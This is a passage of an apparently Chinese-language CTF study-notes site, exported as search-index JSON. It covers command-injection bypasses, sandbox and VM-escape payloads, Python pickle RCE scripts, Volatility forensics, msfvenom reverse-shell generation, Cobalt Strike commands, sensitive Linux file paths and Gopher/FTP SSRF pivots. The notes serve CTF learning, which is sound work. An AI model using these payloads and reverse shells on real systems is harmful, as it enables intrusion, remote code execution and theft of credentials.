'>XX\\\\', '>0x\\\\', '>\\ \\\\', '>rl\\\\', '>cu\\\\', 'sh x', 'sh g', ] for i in payload: assert len(i) 绕过cat \\ rev,more,head,more tac 绕过/readflag 可以使用 bash 时 Trap the SIGALRM signal $ trap \"\" 14 && /readflag Solve the easy challenge first (((((-623343)+(913340))+(-511878))+(791102))-(956792)) input your answer: -387571 ok! here is your flag!! ... mkfifo trick $ mkfifo pipe $ cat pipe | /readflag |(read l;read l;echo \"$(($l))\\n\" > pipe;cat) pipe;cat) input your answer: ok! here is your flag!! ... rm /tmp/pipe; mkfifo /tmp/pipe ; cat /tmp/pipe | /readflag |(read l;read l;echo \"$(($l))\" > /tmp/pipe;cat) https://github.com/ZeddYu/ReadFlag/blob/master/bash.md trap命令 https://man.linuxde.net/trap mkfifo /tmp/f is creating a named pipe at /tmp/f. cat /tmp/f is printing whatever is written to that named pipe and the output of cat /tmp/f is been piped to /readflag 一些绕过技巧 a=dex.php;b=in;d=bas;e=e64;c=$d$e$IFS$b$a;$c; bash变量字符拼接 参考资料 命令注入绕过姿势 https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/ rce bypass http://www.leommxj.com/2017/06/11/RCE-Bypass/ © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/crypto.html":{"url":"library/crypto.html","title":"Crypto","keywords":"","body":"Crypto古典密码codemoji栅栏加密现代密码各种XORRSADHECCDESAEShash签名md5TokenJWT编码现代密码RSACrypto Tools: CyberChef 古典密码 各种单表代换 猪圈 象形文字 弗吉尼亚密码 词频分析 https://www.boxentriq.com/code-breaking/frequency-analysis 通解 quipquip.com codemoji 栅栏加密 现代密码 各种XOR RSA DH ECC DES AES ECB 分块加密 可以分块构造数据 CBC hash签名 md5 利用点 0e开头弱类型比较 fastcoll 选择前缀碰撞 ffifdyop md5后，276f722736c95d99e921722cf9ed621 再转成字符串： 'or'6 Token JWT jwt由三部分构成,以点号隔开 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c 利用点 标头空加密 签名密钥泄露 编码 base family:base85 base64 base58 base32 base16 以及编码表替换 rot13 与佛论禅 社会主义核心价值观编码 现代密码 RSA RSA加密过程 n=p×qn=p\\times qn=p×q ϕ(n)=(p−1)(q−1)\\phi(n)=(p-1)(q-1)ϕ(n)=(p−1)(q−1) e∈(1,ϕ(n)) e\\in (1,\\phi(n))e∈(1,ϕ(n)) ed≡1(modϕ(n))⇔ed=kϕ(n)+1 ed\\equiv 1 \\pmod {\\phi(n)} \\Leftrightarrow ed=k\\phi(n)+1ed≡1(modϕ(n))⇔ed=kϕ(n)+1 aϕ(n)≡1(modn)a^{\\phi(n)}\\equiv 1 \\pmod na​ϕ(n)​​≡1(modn) akϕ(n)+1≡a(modn)a^{k\\phi(n)+1} \\equiv a \\pmod na​kϕ(n)+1​​≡a(modn) aed≡a(modn)a^{ed} \\equiv a \\pmod na​ed​​≡a(modn) 若c≡ae(modn)c\\equiv a^e \\pmod nc≡a​e​​(modn)则cd≡aed≡a(modn)c^d\\equiv {a^{ed}} \\equiv a \\pmod nc​d​​≡a​ed​​≡a(modn) assume dp≡d(mod (p−1)),dq≡d(mod (q−1))assume\\ dp\\equiv d(mod\\ (p-1)),dq\\equiv d(mod\\ (q-1))assume dp≡d(mod (p−1)),dq≡d(mod (q−1)) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/js.html":{"url":"library/js.html","title":"JavaScript","keywords":"","body":"JavaScriptFuzz绕过弱类型比较函数“缺陷”原型链污染参考资料VM虚拟机逃逸BufferPayload参考资料NPM 包管理安全检测拓展资料JavaScript Fuzz Object.getOwnPropertyNames(this) 得到依赖包名 Error().stack 抛出栈错误 绕过 数组绕过 \\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65 编码绕过 弱类型比较 [1] == 1 '1' == 1 函数“缺陷” setTimeout(callback, delay[, ...args]) 当 delay 大于 2147483647 或小于 1 时，则 delay 将会被设置为 1。 非整数的 delay 会被截断为整数。 如果 callback 不是函数，则抛出 TypeError。 原型链污染 参考资料 https://3nd.xyz/2019/09/10/Summary/Javascript-Prototype-Attack/#0x07-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5 VM虚拟机逃逸 Buffer 随机泄露内存 Buffer(100) 升级版 for (var step = 0; step Payload Safe-Eval clearImmediate.constructor(\"return process;\")().mainModule.require(\"child_process\").execSync(\"cat /flag\").toString() (function () { const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } }; function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!=='number') return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\"return process\")(); break; }catch(x){ i++; } } return i.mainModule.require(\"child_process\").execSync(\"cat /flag\").toString() }()).toString() 参考资料 https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md NPM 包管理安全检测 npm audit 拓展资料 nodejs 语法手册 http://nodejs.cn/api/ Vulnerablity Database: https://snyk.io/vuln https://github.com/advisories https://www.npmjs.com/advisories © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/python.html":{"url":"library/python.html","title":"Python","keywords":"","body":"Python攻击面PickleRCErepr() 函数将对象转化为供解释器读取的形式opcode 的一些操作参考资料字符串bool浮点数比较python3 f'{}'函数重载特殊属性拓展资料Python 攻击面 eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen,platform.popen Pickle RCE poc class Exploit(object): def __reduce__(self): return (os.system,('ls',)) 利用脚本 import _pickle as cPickle import sys import base64 COMMAND = sys.argv[1] class PickleRce(object): def __reduce__(self): import os return (os.system,(COMMAND,)) print(base64.b64encode(cPickle.dumps(PickleRce()))) repr() 函数将对象转化为供解释器读取的形式 可以与php serialize()类比 opcode 的一些操作 输出opcode表 import pickletools import prettytable opcode_table = prettytable.PrettyTable() opcode_table.field_names = ['Name', 'Code', 'Docs'] for opcode in pickletools.opcodes: opcode_table.add_row([opcode.name, opcode.code, opcode.doc.splitlines()[0]]) print(opcode_table) +------------------+------+-----------------------------------------------------------------+ | Name | Code | Docs | +------------------+------+-----------------------------------------------------------------+ | INT | I | Push an integer or bool. | | BININT | J | Push a four-byte signed integer. | | BININT1 | K | Push a one-byte unsigned integer. | | BININT2 | M | Push a two-byte unsigned integer. | | LONG | L | Push a long integer. | | LONG1 | | Long integer using one-byte length. | | LONG4 | | Long integer using found-byte length. | | STRING | S | Push a Python string object. | | BINSTRING | T | Push a Python string object. | | SHORT_BINSTRING | U | Push a Python string object. | | BINBYTES | B | Push a Python bytes object. | | SHORT_BINBYTES | C | Push a Python bytes object. | | BINBYTES8 | | Push a Python bytes object. | | BYTEARRAY8 | | Push a Python bytearray object. | | NEXT_BUFFER | | Push an out-of-band buffer object. | | READONLY_BUFFER | | Push True onto the stack. | | NEWFALSE | | Push False onto the stack. | | UNICODE | V | Push a Python Unicode string object. | | SHORT_BINUNICODE | | Push a Python Unicode string object. | | BINUNICODE | X | Push a Python Unicode string object. | | BINUNICODE8 | | Push a Python Unicode string object. | | FLOAT | F | Newline-terminated decimal float literal. | | BINFLOAT | G | Float stored in binary form, with 8 bytes of data. | | EMPTY_LIST | ] | Push an empty list. | | APPEND | a | Append an object to a list. | | APPENDS | e | Extend a list by a slice of stack objects. | | LIST | l | Build a list out of the topmost stack slice, after markobject. | | EMPTY_TUPLE | ) | Push an empty tuple. | | TUPLE | t | Build a tuple out of the topmost stack slice, after markobject. | | TUPLE1 | | Build a one-tuple out of the topmost item on the stack. | | TUPLE2 | | Build a two-tuple out of the top two items on the stack. | | TUPLE3 | | Build a three-tuple out of the top three items on the stack. | | EMPTY_DICT | } | Push an empty dict. | | DICT | d | Build a dict out of the topmost stack slice, after markobject. | | SETITEM | s | Add a key+value pair to an existing dict. | | SETITEMS | u | Add an arbitrary number of key+value pairs to an existing dict. | | EMPTY_SET | | Push an empty set. | | ADDITEMS | | Build a frozenset out of the topmost slice, after markobject. | | POP | 0 | Discard the top stack item, shrinking the stack by one item. | | DUP | 2 | Push the top stack item onto the stack again, duplicating it. | | MARK | ( | Push markobject onto the stack. | | POP_MARK | 1 | Pop all the stack objects at and above the topmost markobject. | | GET | g | Read an object from the memo and push it on the stack. | | BINGET | h | Read an object from the memo and push it on the stack. | | LONG_BINGET | j | Read an object from the memo and push it on the stack. | | PUT | p | Store the stack top into the memo. The stack is not popped. | | BINPUT | q | Store the stack top into the memo. The stack is not popped. | | LONG_BINPUT | r | Store the stack top into the memo. The stack is not popped. | | MEMOIZE | | Store the stack top into the memo. The stack is not popped. | | EXT1 | | Extension code. | | EXT2 | | Extension code. | | EXT4 | | Extension code. | | GLOBAL | c | Push a global object (module.attr) on the stack. | | STACK_GLOBAL | | Push a global object (module.attr) on the stack. | | REDUCE | R | Push an object built from a callable and an argument tuple. | | BUILD | b | Finish building an object, via __setstate__ or dict update. | | INST | i | Build a class instance. | | OBJ | o | Build a class instance. | | NEWOBJ | | Build an object instance. | | NEWOBJ_EX | | Build an object instance. | | PROTO | | Protocol version indicator. | | STOP | . | Stop the unpickling machine. | | FRAME | | Indicate the beginning of a new frame. | | PERSID | P | Push an object identified by a persistent ID. | | BINPERSID | Q | Push an object identified by a persistent ID. | +------------------+------+-----------------------------------------------------------------+ Example: import pickle #import sys import base64 import pickletools #COMMAND = \"ls\" class PickleRce(object): def __init__(self): super(PickleRce, self).__init__() self.id = 1 self.name =\"eki\" #def __reduce__(self): # import os # return (os.system,(COMMAND,)) x = PickleRce() s = pickle.dumps(x) pickletools.dis(s) 参考资料 绕过 RestrictedUnpickler：http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/ 从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 https://zhuanlan.zhihu.com/p/89132768 字符串bool >>> 'a' and True True >>> 'a' and False False >>> True and False False >>> 'a' or False 'a' >>> True or False True >>> False or True True 存在类似SQL Bool Blind的注入 #coding=utf-8 import requests import time import sys import string pt= string.printable url=\"http://992b9ff2-9950-49ec-8925-4fa34293d8a6.node3.buuoj.cn/\" ret = \"flag{\" url = url + \"cgi-bin/pycalx.py\" while True: l = 1 r = 128 while(l+1FLAG#', 'source': tmp } req=requests.post(url,data=data) #print req.text if (req.status_code != requests.codes.ok): continue if \"True\" in req.text: r=mid else : l=mid if(chr(l) not in pt): break ret=ret+chr(l) sys.stdout.write(\"[-]Result : -> {0} \"+ret+\" 浮点数比较 float() inf,nan,infinity python3 f'{}' 在python3.6中，将字符串用{}引起来，加上引号，并且前面加个f就可以把{}中的字符串当做代码执行 f\"{__import__('time').sleep(1)}\" 函数重载 python支持动态修改函数 比如 __builtins__.ord=__builtins__.print ord(\"1\") -> 1 事实上，python中的函数也是对象 python的对象有很多魔术方法 __new__(cls[, ...]) 1. __new__ 是在一个对象实例化的时候所调用的第一个方法 __init__(self[, ...]) 构造器，当一个实例被创建的时候调用的初始化方法 __del__(self) 析构器，当一个实例被销毁的时候调用的方法 __call__(self[, args...]) 允许一个类的实例像函数一样被调用：x(a, b) 调用 x.__call__(a, b) __len__(self) 定义当被 len() 调用时的行为 __repr__(self) 定义当被 repr() 调用时的行为 __str__(self) 定义当被 str() 调用时的行为 __bytes__(self) 定义当被 bytes() 调用时的行为 __hash__(self) 定义当被 hash() 调用时的行为 __bool__(self) 定义当被 bool() 调用时的行为，应该返回 True 或 False __format__(self, format_spec) 定义当被 format() 调用时的行为 有关属性 __getattr__(self, name) 定义当用户试图获取一个不存在的属性时的行为 __getattribute__(self, name) 定义当该类的属性被访问时的行为 __setattr__(self, name, value) 定义当一个属性被设置时的行为 __delattr__(self, name) 定义当一个属性被删除时的行为 __dir__(self) 定义当 dir() 被调用时的行为 __get__(self, instance, owner) 定义当描述符的值被取得时的行为 __set__(self, instance, value) 定义当描述符的值被改变时的行为 __delete__(self, instance) 定义当描述符的值被删除时的行为 比较操作符 __lt__(self, other) 定义小于号的行为：x y 调用 x.__gt__(y) __ge__(self, other) 定义大于等于号的行为：x >= y 调用 x.__ge__(y) 算数运算符 __add__(self, other) 定义加法的行为：+ __sub__(self, other) 定义减法的行为：- __mul__(self, other) 定义乘法的行为：* __truediv__(self, other) 定义真除法的行为：/ __floordiv__(self, other) 定义整数除法的行为：// __mod__(self, other) 定义取模算法的行为：% __divmod__(self, other) 定义当被 divmod() 调用时的行为 __pow__(self, other[, modulo]) 定义当被 power() 调用或 ** 运算时的行为 __lshift__(self, other) 定义按位左移位的行为：> __and__(self, other) 定义按位与操作的行为：& __xor__(self, other) 定义按位异或操作的行为：^ __or__(self, other) 定义按位或操作的行为：| 　　　　　　　　　　　　　　　　　　　　　　反运算 __radd__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rsub__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rmul__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rtruediv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rfloordiv__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rdivmod__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rpow__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rlshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rrshift__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rand__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __rxor__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） __ror__(self, other) （与上方相同，当左操作数不支持相应的操作时被调用） 增量赋值运算 __iadd__(self, other) 定义赋值加法的行为：+= __isub__(self, other) 定义赋值减法的行为：-= __imul__(self, other) 定义赋值乘法的行为：*= __itruediv__(self, other) 定义赋值真除法的行为：/= __ifloordiv__(self, other) 定义赋值整数除法的行为：//= __imod__(self, other) 定义赋值取模算法的行为：%= __ipow__(self, other[, modulo]) 定义赋值幂运算的行为：**= __ilshift__(self, other) 定义赋值按位左移位的行为：>= __iand__(self, other) 定义赋值按位与操作的行为：&= __ixor__(self, other) 定义赋值按位异或操作的行为：^= __ior__(self, other) 定义赋值按位或操作的行为：|= 一元操作符 __pos__(self) 定义正号的行为：+x __neg__(self) 定义负号的行为：-x __abs__(self) 定义当被 abs() 调用时的行为 __invert__(self) 定义按位求反的行为：~x 类型转换 __complex__(self) 定义当被 complex() 调用时的行为（需要返回恰当的值） __int__(self) 定义当被 int() 调用时的行为（需要返回恰当的值） __float__(self) 定义当被 float() 调用时的行为（需要返回恰当的值） __round__(self[, n]) 定义当被 round() 调用时的行为（需要返回恰当的值） __index__(self) 1. 当对象是被应用在切片表达式中时，实现整形强制转换 2. 如果你定义了一个可能在切片时用到的定制的数值型,你应该定义 __index__ 3. 如果 __index__ 被定义，则 __int__ 也需要被定义，且返回相同的值 上下文管理（with 语句） __enter__(self) 1. 定义当使用 with 语句时的初始化行为 2. __enter__ 的返回值被 with 语句的目标或者 as 后的名字绑定 __exit__(self, exc_type, exc_value, traceback) 1. 定义当一个代码块被执行或者终止后上下文管理器应该做什么 2. 一般被用来处理异常，清除工作或者做一些代码块执行完毕之后的日常工作 容器类型 __len__(self) 定义当被 len() 调用时的行为（返回容器中元素的个数） __getitem__(self, key) 定义获取容器中指定元素的行为，相当于 self[key] __setitem__(self, key, value) 定义设置容器中指定元素的行为，相当于 self[key] = value __delitem__(self, key) 定义删除容器中指定元素的行为，相当于 del self[key] __iter__(self) __next__(self) 定义当迭代容器中的元素的行为 __reversed__(self) 定义当被 reversed() 调用时的行为 __contains__(self, item) 定义当使用成员测试运算符（in 或 not in）时的行为 特殊属性 foo.func_code foo.func_globals 拓展资料 Hackergame2019 不同寻常的 Python 考试 ： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84_Python_%E8%80%83%E8%AF%95/README.md © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/bash.html":{"url":"library/bash.html","title":"BASH","keywords":"","body":"一些有用的指令一些有用的指令 tcpdump -n -r nmapll.pcapng 'tcp[13] = 18' | awk '{print $3}'| sort -u © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/forensics.html":{"url":"library/forensics.html","title":"Forensics","keywords":"","body":"ForensicsWindows 取证Andorid 取证Linux 取证内存取证 Volatility参考资料文件恢复ZlibForensics Windows 取证 取证大师 Andorid 取证 sdcard /Android/data Linux 取证 /etc/passwd , /etc/shadow /etc/hosts , /proc/net/arp 内存取证 Volatility volatility -f imageinfo #猜测镜像类型 得到Profile后进入 volshell volatility -f mem.vmem --profile=Win7SP1x64 volshell ps()来列进程,也可以用pslist 插件 一些常用命令 #查看所有进程 volatility -f --profile=Win7SP1x64 psscan #扫描所有的文件列表 volatility -f --profile=Win7SP1x64 filescan volatility -f --profile=Win7SP1x64 filescan | grep \"doc\\|docx\\|rtf\" volatility -f --profile=Win7SP1x64 filescan | grep \"jpg\\|jpeg\\|png\\|tif\\|gif\\|bmp\" volatility -f --profile=Win7SP1x64 filescan | grep \"Desktop\" #扫描 Windows 的服务 volatility -f --profile=Win7SP1x64 svcscan #查看网络连接 volatility -f --profile=Win7SP1x64 connscan #查看命令行上的操作 volatility -f --profile=Win7SP1x64 cmdscan #根据进程的 pid dump出指定进程到指定的文件夹dump_dir volatility -f --profile=Win7SP1x64 memdump -p 120 --dump-dir=dump_dir #dump 出来的进程文件用foremost来分离里面的文件 #查看命令行输入 volatility -f --profile=Win7SP1x64 cmdline #查看系统用户名 volatility -f --profile=Win7SP1x64 printkey -K \"SAM\\Domains\\Account\\Users\\Names\" #查看网络连接 volatility -f --profile=Win7SP1x64 netscan #查看记事本内容 volatility -f --profile=Win7SP1x64 notepad #只能读XP的 volatility -f --profile=Win7SP1x64 editbox #查看ie记录 volatility -f --profile=Win7SP1x64 iehistory #利用更为强大的yarascan volatility -f --profile=Win7SP1x64 yarascan -Y \"/(URL|REDR|LEAK)/\" -p volatility -f --profile=Win7SP1x64 dumpfiles -Q 0x00000000053e9658 --dump-dir=./ 参考资料 官方wiki: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference 内存取证工具 volatility 使用说明： https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/ 文件恢复 Zlib choosing windowBits But zlib can decompress all those formats: to (de-)compress deflate format, use wbits = -zlib.MAX_WBITS to (de-)compress zlib format, use wbits = zlib.MAX_WBITS to (de-)compress gzip format, use wbits = zlib.MAX_WBITS | 16 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/pentest.html":{"url":"library/pentest.html","title":"Pentest","keywords":"","body":"渗透测试资产扫描/信息搜集渗透后渗透Windows 渗透Linux 渗透提权隧道Cobalt Strike渗透测试 资产扫描/信息搜集 Layer子域名挖掘机 Nmap Goby 渗透 敏感信息泄露 源码泄露 DEBUG信息泄露 逻辑漏洞 文件上传 后渗透 Windows 渗透 利用msf套件 反弹shell 生成 msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe 上传到靶机后 msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set LHOST set LPORT exploit 拿到meterpreter shell以后 可以shell进入cmd环境 信息搜集 whoami hostname net user net localgroup administrators 查看是什么操作系统 & 系统版本： 系统中文：systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\" 系统英文：systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" 参考资料 https://guide.offsecnewbie.com/privilege-escalation/windows-pe Linux 渗透 敏感文件 /etc/passwd /etc/shadow /proc /proc/cpuinfo /proc/meminfo /proc/self/maps /proc/self/cwd /proc/self/status /proc/self/exe /proc/self/environ #查看环境变量 /proc/self/cmdline #查看启动参数 /proc/self/root Apache /etc/httpd/conf/httpd.conf /etc/apache2/apache2.conf /etc/apache2/sites-enabled/000-default.conf php /etc/php/7.4/fpm/php.ini /etc/php/7.4/fpm/pool.d/www.conf 字典 https://github.com/ev0A/ArbitraryFileReadList 提权 sudo -l 隧道 ssh port forwarding ssh -R 9001:localhost:9001 root@192.168.19.130 Cobalt Strike sleep 1 （修改回连时间，快速响应操作） getuid（查看当前beacon是以什么身份运行的） getsystem（尝试获取SYSTEM权限） getprivs（获取当前beacon所有权限） net view HACKBIJI（非域用户，查看域HACKBIJI计算机信息，可以看到域控服务器地址） net dclist（域用户，查看域控服务器） net share（列出所有的共享目录和文件） net user (列出所有的用户) © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/protocol.html":{"url":"library/protocol.html","title":"Protocol","keywords":"","body":"网络协议相关工具HTTPHTTP 走私FTPGopher编码脚本参考资料RESP协议网络协议相关 工具 Wireshark HTTP Header Header| 解释| 示例| |--|--|--| Accept| 指定客户端能够接收的内容类型| Accept: text/plain, text/html,application/json| Accept-Charset| 浏览器可以接受的字符编码集。| Accept-Charset: iso-8859-5| Accept-Encoding| 指定浏览器可以支持的web服务器返回内容压缩编码类型。| Accept-Encoding: compress, gzip| Accept-Language| 浏览器可接受的语言| Accept-Language: en,zh| Accept-Ranges| 可以请求网页实体的一个或者多个子范围字段| Accept-Ranges: bytes| Authorization| HTTP授权的授权证书 |Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==| Cache-Control| 指定请求和响应遵循的缓存机制| Cache-Control: no-cache| Connection| 表示是否需要持久连接。（HTTP 1.1默认进行持久连接）| Connection: close| Cookie| HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。| Cookie: $Version=1; Skin=new;| Content-Length| 请求的内容长度| Content-Length: 348| Content-Type| 请求的与实体对应的MIME信息| Content-Type: application/x-www-form-urlencoded| Date| 请求发送的日期和时间| Date: Tue, 15 Nov 2010 08:12:31 GMT| Expect| 请求的特定的服务器行为| Expect: 100-continue| From| 发出请求的用户的Email| From: user@email.com| Host| 指定请求的服务器的域名和端口号| Host: www.zcmhi.com| If-Match| 只有请求内容与实体相匹配才有效| If-Match: “737060cd8c284d8af7ad3082f209582d”| If-Modified-Since| 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码| If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT| If-None-Match| 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变| If-None-Match: “737060cd8c284d8af7ad3082f209582d”| If-Range| 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag| If-Range: “737060cd8c284d8af7ad3082f209582d”| If-Unmodified-Since| 只在实体在指定时间之后未被修改才请求成功| If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT| Max-Forwards| 限制信息通过代理和网关传送的时间| Max-Forwards: 10| Pragma| 用来包含实现特定的指令| Pragma: no-cache| Proxy-Authorization| 连接到代理的授权证书| Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==| Range| 只请求实体的一部分，指定范围| Range: bytes=500-999| Referer| 先前网页的地址，当前请求网页紧随其后,即来路| Referer: http://www.zcmhi.com/archives…| TE| 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息| TE: trailers,deflate;q=0.5| Upgrade| 向服务器指定某种传输协议以便服务器进行转换（如果支持）| Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11| User-Agent| User-Agent的内容包含发出请求的用户信息| User-Agent: Mozilla/5.0 (Linux; X11)| Via| 通知中间网关或代理服务器地址，通信协议| Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)| Warning| 关于消息实体的警告信息| Warn: 199 Miscellaneous warning| X-REAL-IP||| Client-IP||| 一个基本的请求TCP报文 GET /?test=123 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Accept: */* Host: xxx.com Connection: close HTTP 走私 https://mengsec.com/2019/10/10/http-request-smugging/ FTP 基于tcp,发送的也是tcp包，可以利用他作为ssrf的跳板 USER xxx #用户名 PASS xxx #密码 CWD xxx #切换文件夹 TYPE I # 按二进制传输 PORT 127,0,0,1,0,1 # IP + 端口：0*256+1 RETR xxx #发送本地文件到目的地址 STOR xxx #接收目标文件到本地地址 # FTP Listen import socket HOST = '0.0.0.0' PORT = 20000 blocksize = 4096 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((HOST, PORT)) s.listen() conn, addr = s.accept() with conn: while 1: data = conn.recv(blocksize) print(data) if not data: break print('end.') #FTP Send import socket HOST = '0.0.0.0' PORT = 20000 blocksize = 4096 fp = open('test2.bin', 'rb') with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((HOST, PORT)) print('start listen...') s.listen() conn, addr = s.accept() with conn: while 1: buf = fp.read(blocksize) if not buf: fp.close() break conn.sendall(buf) print('end.') 通过pyftplibd库可以实现一个简单的ftp服务器 from pyftpdlib.authorizers import DummyAuthorizer from pyftpdlib.handlers import FTPHandler from pyftpdlib.servers import FTPServer authorizer = DummyAuthorizer() authorizer.add_user(\"admin\", \"admin888\", \".\",perm=\"elrafmwMT\") authorizer.add_anonymous(\".\") handler = FTPHandler handler.permit_foreign_addresses = True handler.passive_ports = range(2000, 2030) handler.authorizer = authorizer server = FTPServer((\"0.0.0.0\", 8899), handler) server.serve_forever() Gopher tcp协议，经典ssrf跳板协议 格式 gopher://127.0.0.1:70/_ + TCP/IP数据(URLENCODE) _可以是任意字符，作为连接符占位 一个示例 ``` GET /?test=123 HTTP/1.1 Host: 127.0.0.1:2222 Pragma: no-cache Cache-Control: no-cache DNT: 1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close ``` 编码后 ``` %47%45%54%20%2f%3f%74%65%73%74%3d%31%32%33%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%3a%32%32%32%32%0d%0a%50%72%61%67%6d%61%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%43%61%63%68%65%2d%43%6f%6e%74%72%6f%6c%3a%20%6e%6f%2d%63%61%63%68%65%0d%0a%44%4e%54%3a%20%31%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%38%33%2e%30%2e%34%31%30%33%2e%36%31%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%